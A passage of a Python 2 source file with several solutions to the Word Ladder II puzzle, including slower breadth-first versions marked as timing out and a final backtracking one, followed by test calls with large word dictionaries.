start_node = self.Node(start, None, dict-{start}|{end})<\exit>
queue = [start_node]<\exit>
while queue:<\exit>
length_0 = len(queue)<\exit>
for i in xrange(length_0):<\exit>
current = queue[i]<\exit>
if current.string==end:<\exit>
self.append(current, result)<\exit>
if result:<\exit>
return result<\exit>
for i in xrange(length_0):<\exit>
current = queue[i].string<\exit>
for pos in xrange(len(current)):<\exit>
lst = list(current)<\exit>
for char in lower_cases:<\exit>
lst[pos] = char<\exit>
temp = "".join(lst)<\exit>
if temp in queue[i].dict:<\exit>
queue.append(self.Node(temp, queue[i], queue[i].dict-{temp}))<\exit>
queue = queue[length_0:]<\exit>
return []<\exit>
def append(self, node, result):<\exit>
cur = node<\exit>
lst = []<\exit>
while cur:<\exit>
lst.insert(0, cur.string)<\exit>
cur = cur.pre<\exit>
result.append(lst)<\exit>
class Solution_TLE:<\exit>
class Node:<\exit>
def __init__(self, string, pre):<\exit>
self.string = string<\exit>
self.pre = pre<\exit>
def __repr__(self):<\exit>
return repr(self.string)<\exit>
def findLadders(self, start, end, dict):<\exit>
dict |= {end}<\exit>
result = []<\exit>
lower_cases = [chr(i+ord('a')) for i in xrange(26)]<\exit>
start_node = self.Node(start, None)<\exit>
queue = [start_node]<\exit>
while queue:<\exit>
length_0 = len(queue)<\exit>
for i in xrange(length_0):<\exit>
current = queue[i]<\exit>
if current.string==end:<\exit>
self.append(current, result)<\exit>
if result:<\exit>
return result<\exit>
for i in xrange(length_0):<\exit>
current = queue[i].string<\exit>
for pos in xrange(len(current)):<\exit>
lst = list(current)<\exit>
for char in lower_cases:<\exit>
lst[pos] = char<\exit>
temp = "".join(lst)<\exit>
if temp in dict and not self.in_previous(queue[i], temp):<\exit>
queue.append(self.Node(temp, queue[i]))<\exit>
queue = queue[length_0:]<\exit>
return []<\exit>
def append(self, node, result):<\exit>
cur = node<\exit>
lst = []<\exit>
while cur:<\exit>
lst.insert(0, cur.string)<\exit>
cur = cur.pre<\exit>
result.append(lst)<\exit>
def in_previous(self, node, string):<\exit>
cur = node<\exit>
while cur:<\exit>
if cur.string==string:<\exit>
return True<\exit>
cur = cur.pre<\exit>
return False<\exit>
class Node:<\exit>
def __init__(self, string, pre):<\exit>
self.string = string<\exit>
self.pre = pre<\exit>
def __repr__(self):<\exit>
return repr(self.string)<\exit>
class Solution_TLE2:<\exit>
def findLadders(self, start, end, dict):<\exit>
dict |= {end}<\exit>
result = []<\exit>
lower_cases = 'abcdefghijklmnopqrstuvwxyz'<\exit>
queue = [Node(start, None)]<\exit>
while queue:<\exit>
length_0 = len(queue)<\exit>
for i in xrange(length_0):<\exit>
current = queue[i]<\exit>
dict -= {current.string}<\exit>
if current.string==end:<\exit>
self.append(current, result)<\exit>
if result:<\exit>
return result<\exit>
for i in xrange(length_0):<\exit>
current = queue[i].string<\exit>
for pos in xrange(len(current)):<\exit>
lst = list(current)<\exit>
for char in lower_cases:<\exit>
lst[pos] = char<\exit>
temp = "".join(lst)<\exit>
if temp in dict:<\exit>
queue.append(Node(temp, queue[i]))<\exit>
queue = queue[length_0:]<\exit>
return []<\exit>
def append(self, node, result):<\exit>
cur = node<\exit>
lst = []<\exit>
while cur:<\exit>
lst.insert(0, cur.string)<\exit>
cur = cur.pre<\exit>
result.append(lst)<\exit>
class Solution:<\exit>
def findLadders(self, start, end, dict):<\exit>
dict |= {start}<\exit>
dict |= {end}<\exit>
result=[]<\exit>
prevMap={}<\exit>
for i in dict:<\exit>
prevMap[i]=[]<\exit>
candidates=[set(), set()]<\exit>
current=0<\exit>
previous=1<\exit>
candidates[current].add(start)<\exit>
while end not in candidates[current]:<\exit>
current, previous = previous, current<\exit>
for i in candidates[previous]: dict -= {i}<\exit>
candidates[current].clear()<\exit>
for word in candidates[previous]:<\exit>
for i in range(len(word)):<\exit>
part1=word[:i]; part2=word[i+1:]<\exit>
for j in 'abcdefghijklmnopqrstuvwxyz':<\exit>
if word[i]!=j:<\exit>
nextword=part1+j+part2<\exit>
if nextword in dict:<\exit>
prevMap[nextword].append(word)<\exit>
candidates[current] |= {nextword}<\exit>
if len(candidates[current])==0: return []<\exit>
self.buildpath(prevMap, end, [], result)<\exit>
return result<\exit>
def buildpath(self, prevMap, word, path, result):<\exit>
if len(prevMap[word])==0:<\exit>
path.append(word)<\exit>
result.append(path[::-1])<\exit>
path.pop()<\exit>
return<\exit>
path.append(word)<\exit>
for predecessor in prevMap[word]:<\exit>
self.buildpath(prevMap, predecessor, path, result)<\exit>
path.pop()<\exit>
if __name__=="__main__":<\exit>
print Solution().findLadders("hot", "dog", set(["hot","dog"]))<\exit>
print Solution().findLadders("hit", "cog", set(["hot","dot","dog","lot","log"]))<\exit>
print Solution().findLadders("cet", "ism", set(["kid","tag","pup","ail","tun","woo","erg","luz","brr","gay","sip","kay","per","val","mes","ohs","now","boa","cet","pal","bar","die","war","hay","eco","pub","lob","rue","fry","lit","rex","jan","cot","bid","ali","pay","col","gum","ger","row","won","dan","rum","fad","tut","sag","yip","sui","ark","has","zip","fez","own","ump","dis","ads","max","jaw","out","btu","ana","gap","cry","led","abe","box","ore","pig","fie","toy","fat","cal","lie","noh","sew","ono","tam","flu","mgm","ply","awe","pry","tit","tie","yet","too","tax","jim","san","pan","map","ski","ova","wed","non","wac","nut","why","bye","lye","oct","old","fin","feb","chi","sap","owl","log","tod","dot","bow","fob","for","joe","ivy","fan","age","fax","hip","jib","mel","hus","sob","ifs","tab","ara","dab","jag","jar","arm","lot","tom","sax","tex","yum","pei","wen","wry","ire","irk","far","mew","wit","doe","gas","rte","ian","pot","ask","wag","hag","amy","nag","ron","soy","gin","don","tug","fay","vic","boo","nam","ave","buy","sop","but","orb","fen","paw","his","sub","bob","yea","oft","inn","rod","yam","pew","web","hod","hun","gyp","wei","wis","rob","gad","pie","mon","dog","bib","rub","ere","dig","era","cat","fox","bee","mod","day","apr","vie","nev","jam","pam","new","aye","ani","and","ibm","yap","can","pyx","tar","kin","fog","hum","pip","cup","dye","lyx","jog","nun","par","wan","fey","bus","oak","bad","ats","set","qom","vat","eat","pus","rev","axe","ion","six","ila","lao","mom","mas","pro","few","opt","poe","art","ash","oar","cap","lop","may","shy","rid","bat","sum","rim","fee","bmw","sky","maj","hue","thy","ava","rap","den","fla","auk","cox","ibo","hey","saw","vim","sec","ltd","you","its","tat","dew","eva","tog","ram","let","see","zit","maw","nix","ate","gig","rep","owe","ind","hog","eve","sam","zoo","any","dow","cod","bed","vet","ham","sis","hex","via","fir","nod","mao","aug","mum","hoe","bah","hal","keg","hew","zed","tow","gog","ass","dem","who","bet","gos","son","ear","spy","kit","boy","due","sen","oaf","mix","hep","fur","ada","bin","nil","mia","ewe","hit","fix","sad","rib","eye","hop","haw","wax","mid","tad","ken","wad","rye","pap","bog","gut","ito","woe","our","ado","sin","mad","ray","hon","roy","dip","hen","iva","lug","asp","hui","yak","bay","poi","yep","bun","try","lad","elm","nat","wyo","gym","dug","toe","dee","wig","sly","rip","geo","cog","pas","zen","odd","nan","lay","pod","fit","hem","joy","bum","rio","yon","dec","leg","put","sue","dim","pet","yaw","nub","bit","bur","sid","sun","oil","red","doc","moe","caw","eel","dix","cub","end","gem","off","yew","hug","pop","tub","sgt","lid","pun","ton","sol","din","yup","jab","pea","bug","gag","mil","jig","hub","low","did","tin","get","gte","sox","lei","mig","fig","lon","use","ban","flo","nov","jut","bag","mir","sty","lap","two","ins","con","ant","net","tux","ode","stu","mug","cad","nap","gun","fop","tot","sow","sal","sic","ted","wot","del","imp","cob","way","ann","tan","mci","job","wet","ism","err","him","all","pad","hah","hie","aim","ike","jed","ego","mac","baa","min","com","ill","was","cab","ago","ina","big","ilk","gal","tap","duh","ola","ran","lab","top","gob","hot","ora","tia","kip","han","met","hut","she","sac","fed","goo","tee","ell","not","act","gil","rut","ala","ape","rig","cid","god","duo","lin","aid","gel","awl","lag","elf","liz","ref","aha","fib","oho","tho","her","nor","ace","adz","fun","ned","coo","win","tao","coy","van","man","pit","guy","foe","hid","mai","sup","jay","hob","mow","jot","are","pol","arc","lax","aft","alb","len","air","pug","pox","vow","got","meg","zoe","amp","ale","bud","gee","pin","dun","pat","ten","mob"]))<\exit>
print Solution().findLadders("nanny", "aloud", set(["ricky","grind","cubic","panic","lover","farce","gofer","sales","flint","omens","lipid","briny","cloth","anted","slime","oaten","harsh","touts","stoop","cabal","lazed","elton","skunk","nicer","pesky","kusch","bused","kinda","tunis","enjoy","aches","prowl","babar","rooms","burst","slush","pines","urine","pinky","bayed","mania","light","flare","wares","women","verne","moron","shine","bluer","zeros","bleak","brief","tamra","vasts","jamie","lairs","penal","worst","yowls","pills","taros","addle","alyce","creep","saber","floyd","cures","soggy","vexed","vilma","cabby","verde","euler","cling","wanna","jenny","donor","stole","sakha","blake","sanes","riffs","forge","horus","sered","piked","prosy","wases","glove","onset","spake","benin","talks","sites","biers","wendy","dante","allan","haven","nears","shaka","sloth","perky","spear","spend","clint","dears","sadly","units","vista","hinds","marat","natal","least","bough","pales","boole","ditch","greys","slunk","bitch","belts","sense","skits","monty","yawns","music","hails","alien","gibes","lille","spacy","argot","wasps","drubs","poops","bella","clone","beast","emend","iring","start","darla","bells","cults","dhaka","sniff","seers","bantu","pages","fever","tacky","hoses","strop","climb","pairs","later","grant","raven","stael","drips","lucid","awing","dines","balms","della","galen","toned","snips","shady","chili","fears","nurse","joint","plump","micky","lions","jamal","queer","ruins","frats","spoof","semen","pulps","oldie","coors","rhone","papal","seals","spans","scaly","sieve","klaus","drums","tided","needs","rider","lures","treks","hares","liner","hokey","boots","primp","laval","limes","putts","fonda","damon","pikes","hobbs","specs","greet","ketch","braid","purer","tsars","berne","tarts","clean","grate","trips","chefs","timex","vicky","pares","price","every","beret","vices","jodie","fanny","mails","built","bossy","farms","pubic","gongs","magma","quads","shell","jocks","woods","waded","parka","jells","worse","diner","risks","bliss","bryan","terse","crier","incur","murky","gamed","edges","keens","bread","raced","vetch","glint","zions","porno","sizes","mends","ached","allie","bands","plank","forth","fuels","rhyme","wimpy","peels","foggy","wings","frill","edgar","slave","lotus","point","hints","germs","clung","limed","loafs","realm","myron","loopy","plush","volts","bimbo","smash","windy","sours","choke","karin","boast","whirr","tiber","dimes","basel","cutes","pinto","troll","thumb","decor","craft","tared","split","josue","tramp","screw","label","lenny","apses","slept","sikhs","child","bouts","cites","swipe","lurks","seeds","fists","hoard","steed","reams","spoil","diego","peale","bevel","flags","mazes","quart","snipe","latch","lards","acted","falls","busby","holed","mummy","wrong","wipes","carlo","leers","wails","night","pasty","eater","flunk","vedas","curse","tyros","mirth","jacky","butte","wired","fixes","tares","vague","roved","stove","swoon","scour","coked","marge","cants","comic","corns","zilch","typos","lives","truer","comma","gaily","teals","witty","hyper","croat","sways","tills","hones","dowel","llano","clefs","fores","cinch","brock","vichy","bleed","nuder","hoyle","slams","macro","arabs","tauts","eager","croak","scoop","crime","lurch","weals","fates","clipt","teens","bulls","domed","ghana","culls","frame","hanky","jared","swain","truss","drank","lobby","lumps","pansy","whews","saris","trite","weeps","dozes","jeans","flood","chimu","foxes","gelds","sects","scoff","poses","mares","famed","peers","hells","laked","zests","wring","steal","snoot","yodel","scamp","ellis","bandy","marry","jives","vises","blurb","relay","patch","haley","cubit","heine","place","touch","grain","gerry","badly","hooke","fuchs","savor","apron","judge","loren","britt","smith","tammy","altar","duels","huber","baton","dived","apace","sedan","basts","clark","mired","perch","hulks","jolly","welts","quack","spore","alums","shave","singe","lanny","dread","profs","skeet","flout","darin","newed","steer","taine","salvo","mites","rules","crash","thorn","olive","saves","yawed","pique","salon","ovens","dusty","janie","elise","carve","winds","abash","cheep","strap","fared","discs","poxed","hoots","catch","combo","maize","repay","mario","snuff","delve","cored","bards","sudan","shuns","yukon","jowls","wayne","torus","gales","creek","prove","needy","wisps","terri","ranks","books","dicky","tapes","aping","padre","roads","nines","seats","flats","rains","moira","basic","loves","pulls","tough","gills","codes","chest","teeny","jolts","woody","flame","asked","dulls","hotly","glare","mucky","spite","flake","vines","lindy","butts","froth","beeps","sills","bunny","flied","shaun","mawed","velds","voled","doily","patel","snake","thigh","adler","calks","desks","janus","spunk","baled","match","strip","hosed","nippy","wrest","whams","calfs","sleet","wives","boars","chain","table","duked","riped","edens","galas","huffs","biddy","claps","aleut","yucks","bangs","quids","glenn","evert","drunk","lusts","senna","slate","manet","roted","sleep","loxes","fluky","fence","clamp","doted","broad","sager","spark","belch","mandy","deana","beyer","hoist","leafy","levee","libel","tonic","aloes","steam","skews","tides","stall","rifts","saxon","mavis","asama","might","dotes","tangs","wroth","kited","salad","liens","clink","glows","balky","taffy","sided","sworn","oasis","tenth","blurt","tower","often","walsh","sonny","andes","slump","scans","boded","chive","finer","ponce","prune","sloes","dined","chums","dingo","harte","ahead","event","freer","heart","fetch","sated","soapy","skins","royal","cuter","loire","minot","aisle","horny","slued","panel","eight","snoop","pries","clive","pored","wrist","piped","daren","cells","parks","slugs","cubed","highs","booze","weary","stain","hoped","finny","weeds","fetid","racer","tasks","right","saint","shahs","basis","refer","chart","seize","lulls","slant","belay","clots","jinny","tours","modes","gloat","dunks","flute","conch","marts","aglow","gayer","lazes","dicks","chime","bears","sharp","hatch","forms","terry","gouda","thins","janet","tonya","axons","sewed","danny","rowdy","dolts","hurry","opine","fifty","noisy","spiky","humid","verna","poles","jayne","pecos","hooky","haney","shams","snots","sally","ruder","tempe","plunk","shaft","scows","essie","dated","fleet","spate","bunin","hikes","sodas","filly","thyme","fiefs","perks","chary","kiths","lidia","lefty","wolff","withe","three","crawl","wotan","brown","japed","tolls","taken","threw","crave","clash","layer","tends","notes","fudge","musky","bawdy","aline","matts","shirr","balks","stash","wicks","crepe","foods","fares","rotes","party","petty","press","dolly","mangy","leeks","silly","leant","nooks","chapt","loose","caged","wages","grist","alert","sheri","moody","tamps","hefts","souls","rubes","rolex","skulk","veeps","nonce","state","level","whirl","bight","grits","reset","faked","spiny","mixes","hunks","major","missy","arius","damns","fitly","caped","mucus","trace","surat","lloyd","furry","colin","texts","livia","reply","twill","ships","peons","shear","norms","jumbo","bring","masks","zippy","brine","dorks","roded","sinks","river","wolfs","strew","myths","pulpy","prank","veins","flues","minus","phone","banns","spell","burro","brags","boyle","lambs","sides","knees","clews","aired","skirt","heavy","dimer","bombs","scums","hayes","chaps","snugs","dusky","loxed","ellen","while","swank","track","minim","wiled","hazed","roofs","cantu","sorry","roach","loser","brass","stint","jerks","dirks","emory","campy","poise","sexed","gamer","catty","comte","bilbo","fasts","ledge","drier","idles","doors","waged","rizal","pured","weirs","crisp","tasty","sored","palmy","parts","ethel","unify","crows","crest","udder","delis","punks","dowse","totes","emile","coded","shops","poppa","pours","gushy","tiffs","shads","birds","coils","areas","boons","hulls","alter","lobes","pleat","depth","fires","pones","serra","sweat","kline","malay","ruled","calve","tired","drabs","tubed","wryer","slung","union","sonya","aided","hewed","dicey","grids","nixed","whits","mills","buffs","yucky","drops","ready","yuppy","tweet","napes","cadre","teach","rasps","dowdy","hoary","canto","posed","dumbo","kooks","reese","snaky","binge","byron","phony","safer","friar","novel","scale","huron","adorn","carla","fauna","myers","hobby","purse","flesh","smock","along","boils","pails","times","panza","lodge","clubs","colby","great","thing","peaks","diana","vance","whets","bergs","sling","spade","soaks","beach","traps","aspen","romps","boxed","fakir","weave","nerds","swazi","dotty","curls","diver","jonas","waite","verbs","yeast","lapel","barth","soars","hooks","taxed","slews","gouge","slags","chang","chafe","saved","josie","syncs","fonds","anion","actor","seems","pyrex","isiah","glued","groin","goren","waxes","tonia","whine","scads","knelt","teaks","satan","tromp","spats","merry","wordy","stake","gland","canal","donna","lends","filed","sacks","shied","moors","paths","older","pooch","balsa","riced","facet","decaf","attic","elder","akron","chomp","chump","picky","money","sheer","bolls","crabs","dorms","water","veers","tease","dummy","dumbs","lethe","halls","rifer","demon","fucks","whips","plops","fuses","focal","taces","snout","edict","flush","burps","dawes","lorry","spews","sprat","click","deann","sited","aunts","quips","godly","pupil","nanny","funks","shoon","aimed","stacy","helms","mints","banks","pinch","local","twine","pacts","deers","halos","slink","preys","potty","ruffs","pusan","suits","finks","slash","prods","dense","edsel","heeds","palls","slats","snits","mower","rares","ailed","rouge","ellie","gated","lyons","duded","links","oaths","letha","kicks","firms","gravy","month","kongo","mused","ducal","toted","vocal","disks","spied","studs","macao","erick","coupe","starr","reaps","decoy","rayon","nicks","breed","cosby","haunt","typed","plain","trays","muled","saith","drano","cower","snows","buses","jewry","argus","doers","flays","swish","resin","boobs","sicks","spies","bails","wowed","mabel","check","vapid","bacon","wilda","ollie","loony","irked","fraud","doles","facts","lists","gazed","furls","sunks","stows","wilde","brick","bowed","guise","suing","gates","niter","heros","hyped","clomp","never","lolls","rangy","paddy","chant","casts","terns","tunas","poker","scary","maims","saran","devon","tripe","lingo","paler","coped","bride","voted","dodge","gross","curds","sames","those","tithe","steep","flaks","close","swops","stare","notch","prays","roles","crush","feuds","nudge","baned","brake","plans","weepy","dazed","jenna","weiss","tomes","stews","whist","gibed","death","clank","cover","peeks","quick","abler","daddy","calls","scald","lilia","flask","cheer","grabs","megan","canes","jules","blots","mossy","begun","freak","caved","hello","hades","theed","wards","darcy","malta","peter","whorl","break","downs","odder","hoofs","kiddo","macho","fords","liked","flees","swing","elect","hoods","pluck","brook","astir","bland","sward","modal","flown","ahmad","waled","craps","cools","roods","hided","plath","kings","grips","gives","gnats","tabby","gauls","think","bully","fogey","sawed","lints","pushy","banes","drake","trail","moral","daley","balds","chugs","geeky","darts","soddy","haves","opens","rends","buggy","moles","freud","gored","shock","angus","puree","raves","johns","armed","packs","minis","reich","slots","totem","clown","popes","brute","hedge","latin","stoke","blend","pease","rubik","greer","hindi","betsy","flows","funky","kelli","humps","chewy","welds","scowl","yells","cough","sasha","sheaf","jokes","coast","words","irate","hales","camry","spits","burma","rhine","bends","spill","stubs","power","voles","learn","knoll","style","twila","drove","dacca","sheen","papas","shale","jones","duped","tunny","mouse","floss","corks","skims","swaps","inned","boxer","synch","skies","strep","bucks","belau","lower","flaky","quill","aural","rufus","floes","pokes","sends","sates","dally","boyer","hurts","foyer","gowns","torch","luria","fangs","moats","heinz","bolts","filet","firth","begot","argue","youth","chimp","frogs","kraft","smite","loges","loons","spine","domes","pokey","timur","noddy","doggy","wades","lanes","hence","louts","turks","lurid","goths","moist","bated","giles","stood","winos","shins","potts","brant","vised","alice","rosie","dents","babes","softy","decay","meats","tanya","rusks","pasts","karat","nuked","gorge","kinks","skull","noyce","aimee","watch","cleat","stuck","china","testy","doses","safes","stage","bayes","twins","limps","denis","chars","flaps","paces","abase","grays","deans","maria","asset","smuts","serbs","whigs","vases","robyn","girls","pents","alike","nodal","molly","swigs","swill","slums","rajah","bleep","beget","thanh","finns","clock","wafts","wafer","spicy","sorer","reach","beats","baker","crown","drugs","daisy","mocks","scots","fests","newer","agate","drift","marta","chino","flirt","homed","bribe","scram","bulks","servo","vesta","divas","preps","naval","tally","shove","ragas","blown","droll","tryst","lucky","leech","lines","sires","pyxed","taper","trump","payee","midge","paris","bored","loads","shuts","lived","swath","snare","boned","scars","aeons","grime","writs","paige","rungs","blent","signs","davis","dials","daubs","rainy","fawns","wrier","golds","wrath","ducks","allow","hosea","spike","meals","haber","muses","timed","broom","burks","louis","gangs","pools","vales","altai","elope","plied","slain","chasm","entry","slide","bawls","title","sings","grief","viola","doyle","peach","davit","bench","devil","latex","miles","pasha","tokes","coves","wheel","tried","verdi","wanda","sivan","prior","fryer","plots","kicky","porch","shill","coats","borne","brink","pawed","erwin","tense","stirs","wends","waxen","carts","smear","rival","scare","phase","bragg","crane","hocks","conan","bests","dares","molls","roots","dunes","slips","waked","fours","bolds","slosh","yemen","poole","solid","ports","fades","legal","cedes","green","curie","seedy","riper","poled","glade","hosts","tools","razes","tarry","muddy","shims","sword","thine","lasts","bloat","soled","tardy","foots","skiff","volta","murks","croci","gooks","gamey","pyxes","poems","kayla","larva","slaps","abuse","pings","plows","geese","minks","derby","super","inked","manic","leaks","flops","lajos","fuzes","swabs","twigs","gummy","pyres","shrew","islet","doled","wooly","lefts","hunts","toast","faith","macaw","sonia","leafs","colas","conks","altos","wiped","scene","boors","patsy","meany","chung","wakes","clear","ropes","tahoe","zones","crate","tombs","nouns","garth","puked","chats","hanks","baked","binds","fully","soaps","newel","yarns","puers","carps","spelt","lully","towed","scabs","prime","blest","patty","silky","abner","temps","lakes","tests","alias","mines","chips","funds","caret","splat","perry","turds","junks","cramp","saned","peary","snarl","fired","stung","nancy","bulge","styli","seams","hived","feast","triad","jaded","elvin","canny","birth","routs","rimed","pusey","laces","taste","basie","malls","shout","prier","prone","finis","claus","loops","heron","frump","spare","menus","ariel","crams","bloom","foxed","moons","mince","mixed","piers","deres","tempt","dryer","atone","heats","dario","hawed","swims","sheet","tasha","dings","clare","aging","daffy","wried","foals","lunar","havel","irony","ronny","naves","selma","gurus","crust","percy","murat","mauro","cowed","clang","biker","harms","barry","thump","crude","ulnae","thong","pager","oases","mered","locke","merle","soave","petal","poser","store","winch","wedge","inlet","nerdy","utter","filth","spray","drape","pukes","ewers","kinds","dates","meier","tammi","spoor","curly","chill","loped","gooey","boles","genet","boost","beets","heath","feeds","growl","livid","midst","rinds","fresh","waxed","yearn","keeps","rimes","naked","flick","plies","deeps","dirty","hefty","messy","hairy","walks","leper","sykes","nerve","rover","jived","brisk","lenin","viper","chuck","sinus","luger","ricks","hying","rusty","kathy","herds","wider","getty","roman","sandy","pends","fezes","trios","bites","pants","bless","diced","earth","shack","hinge","melds","jonah","chose","liver","salts","ratty","ashed","wacky","yokes","wanly","bruce","vowel","black","grail","lungs","arise","gluts","gluey","navel","coyer","ramps","miter","aldan","booth","musty","rills","darns","tined","straw","kerri","hared","lucks","metes","penny","radon","palms","deeds","earls","shard","pried","tampa","blank","gybes","vicki","drool","groom","curer","cubes","riggs","lanky","tuber","caves","acing","golly","hodge","beard","ginny","jibed","fumes","astor","quito","cargo","randi","gawky","zings","blind","dhoti","sneak","fatah","fixer","lapps","cline","grimm","fakes","maine","erika","dealt","mitch","olden","joist","gents","likes","shelf","silts","goats","leads","marin","spire","louie","evans","amuse","belly","nails","snead","model","whats","shari","quote","tacks","nutty","lames","caste","hexes","cooks","miner","shawn","anise","drama","trike","prate","ayers","loans","botch","vests","cilia","ridge","thugs","outed","jails","moped","plead","tunes","nosed","wills","lager","lacks","cried","wince","berle","flaws","boise","tibet","bided","shred","cocky","brice","delta","congo","holly","hicks","wraps","cocks","aisha","heard","cured","sades","horsy","umped","trice","dorky","curve","ferry","haler","ninth","pasta","jason","honer","kevin","males","fowls","awake","pores","meter","skate","drink","pussy","soups","bases","noyes","torts","bogus","still","soupy","dance","worry","eldon","stern","menes","dolls","dumpy","gaunt","grove","coops","mules","berry","sower","roams","brawl","greed","stags","blurs","swift","treed","taney","shame","easel","moves","leger","ville","order","spock","nifty","brian","elias","idler","serve","ashen","bizet","gilts","spook","eaten","pumas","cotes","broke","toxin","groan","laths","joins","spots","hated","tokay","elite","rawer","fiats","cards","sassy","milks","roost","glean","lutes","chins","drown","marks","pined","grace","fifth","lodes","rusts","terms","maxes","savvy","choir","savoy","spoon","halve","chord","hulas","sarah","celia","deems","ninny","wines","boggy","birch","raved","wales","beams","vibes","riots","warty","nigel","askew","faxes","sedge","sheol","pucks","cynic","relax","boers","whims","bents","candy","luann","slogs","bonny","barns","iambs","fused","duffy","guilt","bruin","pawls","penis","poppy","owing","tribe","tuner","moray","timid","ceded","geeks","kites","curio","puffy","perot","caddy","peeve","cause","dills","gavel","manse","joker","lynch","crank","golda","waits","wises","hasty","paves","grown","reedy","crypt","tonne","jerky","axing","swept","posse","rings","staff","tansy","pared","glaze","grebe","gonna","shark","jumps","vials","unset","hires","tying","lured","motes","linen","locks","mamas","nasty","mamie","clout","nader","velma","abate","tight","dales","serer","rives","bales","loamy","warps","plato","hooch","togae","damps","ofter","plumb","fifes","filmy","wiper","chess","lousy","sails","brahe","ounce","flits","hindu","manly","beaux","mimed","liken","forts","jambs","peeps","lelia","brews","handy","lusty","brads","marne","pesos","earle","arson","scout","showy","chile","sumps","hiked","crook","herbs","silks","alamo","mores","dunce","blaze","stank","haste","howls","trots","creon","lisle","pause","hates","mulch","mined","moder","devin","types","cindy","beech","tuned","mowed","pitts","chaos","colds","bidet","tines","sighs","slimy","brain","belle","leery","morse","ruben","prows","frown","disco","regal","oaken","sheds","hives","corny","baser","fated","throe","revel","bores","waved","shits","elvia","ferns","maids","color","coifs","cohan","draft","hmong","alton","stine","cluck","nodes","emily","brave","blair","blued","dress","bunts","holst","clogs","rally","knack","demos","brady","blues","flash","goofy","blocs","diane","colic","smile","yules","foamy","splay","bilge","faker","foils","condo","knell","crack","gallo","purls","auras","cakes","doves","joust","aides","lades","muggy","tanks","middy","tarps","slack","capet","frays","donny","venal","yeats","misty","denim","glass","nudes","seeps","gibbs","blows","bobbi","shane","yards","pimps","clued","quiet","witch","boxes","prawn","kerry","torah","kinko","dingy","emote","honor","jelly","grins","trope","vined","bagel","arden","rapid","paged","loved","agape","mural","budge","ticks","suers","wendi","slice","salve","robin","bleat","batik","myles","teddy","flatt","puppy","gelid","largo","attar","polls","glide","serum","fundy","sucks","shalt","sewer","wreak","dames","fonts","toxic","hines","wormy","grass","louse","bowls","crass","benny","moire","margo","golfs","smart","roxie","wight","reign","dairy","clops","paled","oddly","sappy","flair","shown","bulgy","benet","larch","curry","gulfs","fends","lunch","dukes","doris","spoke","coins","manna","conga","jinns","eases","dunno","tisha","swore","rhino","calms","irvin","clans","gully","liege","mains","besot","serge","being","welch","wombs","draco","lynda","forty","mumps","bloch","ogden","knits","fussy","alder","danes","loyal","valet","wooer","quire","liefs","shana","toyed","forks","gages","slims","cloys","yates","rails","sheep","nacho","divan","honks","stone","snack","added","basal","hasps","focus","alone","laxes","arose","lamed","wrapt","frail","clams","plait","hover","tacos","mooch","fault","teeth","marva","mucks","tread","waves","purim","boron","horde","smack","bongo","monte","swirl","deals","mikes","scold","muter","sties","lawns","fluke","jilts","meuse","fives","sulky","molds","snore","timmy","ditty","gasps","kills","carey","jawed","byers","tommy","homer","hexed","dumas","given","mewls","smelt","weird","speck","merck","keats","draws","trent","agave","wells","chews","blabs","roves","grieg","evens","alive","mulls","cared","garbo","fined","happy","trued","rodes","thurs","cadet","alvin","busch","moths","guild","staci","lever","widen","props","hussy","lamer","riley","bauer","chirp","rants","poxes","shyer","pelts","funny","slits","tinge","ramos","shift","caper","credo","renal","veils","covey","elmer","mated","tykes","wooed","briar","gears","foley","shoes","decry","hypes","dells","wilds","runts","wilts","white","easts","comer","sammy","lochs","favor","lance","dawns","bushy","muted","elsie","creel","pocks","tenet","cagey","rides","socks","ogled","soils","sofas","janna","exile","barks","frank","takes","zooms","hakes","sagan","scull","heaps","augur","pouch","blare","bulbs","wryly","homey","tubas","limbo","hardy","hoagy","minds","bared","gabby","bilks","float","limns","clasp","laura","range","brush","tummy","kilts","cooed","worms","leary","feats","robes","suite","veals","bosch","moans","dozen","rarer","slyer","cabin","craze","sweet","talon","treat","yanks","react","creed","eliza","sluts","cruet","hafts","noise","seder","flies","weeks","venus","backs","eider","uriel","vouch","robed","hacks","perth","shiny","stilt","torte","throb","merer","twits","reeds","shawl","clara","slurs","mixer","newts","fried","woolf","swoop","kaaba","oozed","mayer","caned","laius","lunge","chits","kenny","lifts","mafia","sowed","piled","stein","whack","colts","warms","cleft","girds","seeks","poets","angel","trade","parsi","tiers","rojas","vexes","bryce","moots","grunt","drain","lumpy","stabs","poohs","leapt","polly","cuffs","giddy","towns","dacha","quoth","provo","dilly","carly","mewed","tzars","crock","toked","speak","mayas","pssts","ocher","motel","vogue","camps","tharp","taunt","drone","taint","badge","scott","scats","bakes","antes","gruel","snort","capes","plate","folly","adobe","yours","papaw","hench","moods","clunk","chevy","tomas","narcs","vonda","wiles","prigs","chock","laser","viced","stiff","rouse","helps","knead","gazer","blade","tumid","avail","anger","egged","guide","goads","rabin","toddy","gulps","flank","brats","pedal","junky","marco","tinny","tires","flier","satin","darth","paley","gumbo","rared","muffs","rower","prude","frees","quays","homes","munch","beefs","leash","aston","colon","finch","bogey","leaps","tempo","posts","lined","gapes","locus","maori","nixes","liven","songs","opted","babel","wader","barer","farts","lisps","koran","lathe","trill","smirk","mamma","viler","scurf","ravel","brigs","cooky","sachs","fulls","goals","turfs","norse","hauls","cores","fairy","pluto","kneed","cheek","pangs","risen","czars","milne","cribs","genes","wefts","vents","sages","seres","owens","wiley","flume","haded","auger","tatty","onion","cater","wolfe","magic","bodes","gulls","gazes","dandy","snags","rowed","quell","spurn","shore","veldt","turns","slavs","coach","stalk","snuck","piles","orate","joyed","daily","crone","wager","solos","earns","stark","lauds","kasey","villa","gnaws","scent","wears","fains","laced","tamer","pipes","plant","lorie","rivet","tamed","cozen","theme","lifer","sunny","shags","flack","gassy","eased","jeeps","shire","fargo","timer","brash","behan","basin","volga","krone","swiss","docks","booed","ebert","gusty","delay","oared","grady","buick","curbs","crete","lucas","strum","besom","gorse","troth","donne","chink","faced","ahmed","texas","longs","aloud","bethe","cacao","hilda","eagle","karyn","harks","adder","verse","drays","cello","taped","snide","taxis","kinky","penes","wicca","sonja","aways","dyers","bolas","elfin","slope","lamps","hutch","lobed","baaed","masts","ashes","ionic","joyce","payed","brays","malts","dregs","leaky","runny","fecal","woven","hurls","jorge","henna","dolby","booty","brett","dykes","rural","fight","feels","flogs","brunt","preen","elvis","dopey","gripe","garry","gamma","fling","space","mange","storm","arron","hairs","rogue","repel","elgar","ruddy","cross","medan","loses","howdy","foams","piker","halts","jewel","avery","stool","cruel","cases","ruses","cathy","harem","flour","meted","faces","hobos","charm","jamar","cameo","crape","hooey","reefs","denny","mitts","sores","smoky","nopes","sooty","twirl